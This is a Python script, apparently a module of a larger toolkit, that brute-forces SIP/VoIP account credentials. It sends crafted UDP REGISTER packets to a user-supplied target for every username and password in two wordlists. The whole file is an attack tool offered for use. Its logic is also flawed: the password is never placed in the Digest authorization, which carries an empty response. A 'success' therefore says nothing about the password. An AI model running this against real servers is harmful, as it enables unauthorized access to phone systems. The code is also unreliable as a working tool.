import socket
import random
import string
import threading
import os
from queue import Queue
from functions.func import get_local_ip

def generate_random_call_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def generate_random_extension(start_range, end_range):
    return str(random.randint(start_range, end_range))

def read_wordlist_from_txt(filename):
    """Read a wordlist from a file."""
    if not os.path.exists(filename):
        print(f"Error: Wordlist file '{filename}' not found.")
        return []
    
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def send_sip_register(ip, port, username, password, from_user, to_user, extension_range_start, extension_range_end, timeout=5):
    call_id = generate_random_call_id()
    contact_extension = generate_random_extension(extension_range_start, extension_range_end)
    local_ip = get_local_ip()

    # Create a UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)

    try:
        # Craft the SIP REGISTER packet
        register_msg = (
            f"REGISTER sip:{ip} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {local_ip}:{port};branch=z9hG4bK-{call_id}\r\n"
            f"Max-Forwards: 70\r\n"
            f"From: <sip:{from_user}@{local_ip}>;tag={call_id}\r\n"
            f"To: <sip:{to_user}@{ip}>\r\n"
            f"Call-ID: {call_id}@{ip}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Authorization: Digest username=\"{username}\", realm=\"{ip}\", nonce=\"{call_id}\", uri=\"sip:{to_user}@{ip}\", response=\"\"\r\n"
            f"Contact: <sip:{from_user}@{local_ip}:{port};extension={contact_extension}>\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        # Send the packet
        s.sendto(register_msg.encode(), (ip, port))

        # Try to receive a response
        try:
            data, addr = s.recvfrom(1024)
            response = data.decode()
            if "200 OK" in response:
                print(f"Success! Username: {username}, Password: {password}")
                return True
        except socket.timeout:
            pass
        return False

    finally:
        s.close()

def main():
    print("SIP Brute Force Module")
    print("---------------------")
    
    # Get user input
    ip = input("Enter target IP: ")
    port = int(input("Enter target port (default 5060): ") or "5060")
    from_user = input("Enter from user (default 1000): ") or "1000"
    to_user = input("Enter to user (default 1000): ") or "1000"
    
    # Get wordlist paths
    username_file = input("Enter path to username wordlist: ")
    password_file = input("Enter path to password wordlist: ")
    
    # Read wordlists
    usernames = read_wordlist_from_txt(username_file)
    passwords = read_wordlist_from_txt(password_file)
    
    if not usernames or not passwords:
        print("Error: Could not read wordlists. Please check the file paths.")
        return
    
    print(f"\nLoaded {len(usernames)} usernames and {len(passwords)} passwords")
    print("Starting brute force attack...\n")
    
    # Try each username/password combination
    for username in usernames:
        for password in passwords:
            if send_sip_register(ip, port, username, password, from_user, to_user, 1000, 9999):
                print(f"\nFound valid credentials!")
                print(f"Username: {username}")
                print(f"Password: {password}")
                return
    
    print("\nNo valid credentials found.")

if __name__ == "__main__":
    main()
